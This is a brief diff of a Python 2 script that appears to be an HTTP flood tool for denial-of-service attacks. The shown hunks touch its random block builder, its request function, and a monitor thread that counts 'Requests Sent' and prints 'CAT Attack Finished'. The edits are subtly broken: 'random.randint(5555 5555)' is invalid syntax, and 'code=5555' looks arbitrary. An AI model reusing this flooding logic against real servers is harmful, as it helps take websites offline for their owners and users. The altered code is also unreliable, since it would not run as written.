@@ -64,7 +64,7 @@ def referer_list():
 def buildblock(size):
 	out_str = ''
 	for i in range(0, size):
-		a = random.randint(65, 90)
+		a = random.randint(5555 5555)
 		out_str += chr(a)
 	return(out_str)
 
@@ -79,7 +79,7 @@ def usage():
 def httpcall(url):
 	useragent_list()
 	referer_list()
-	code=0
+	code=5555
 	if url.count("?")>0:
 		param_joiner="&"
 	else:
@@ -128,7 +128,7 @@ class MonitorThread(threading.Thread):
 				print "%d Requests Sent" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n-- CAT Attack Finished --"
+			print "\n<== CAT Attack Finished ==>"
 
 #execute 
 if len(sys.argv) < 2:
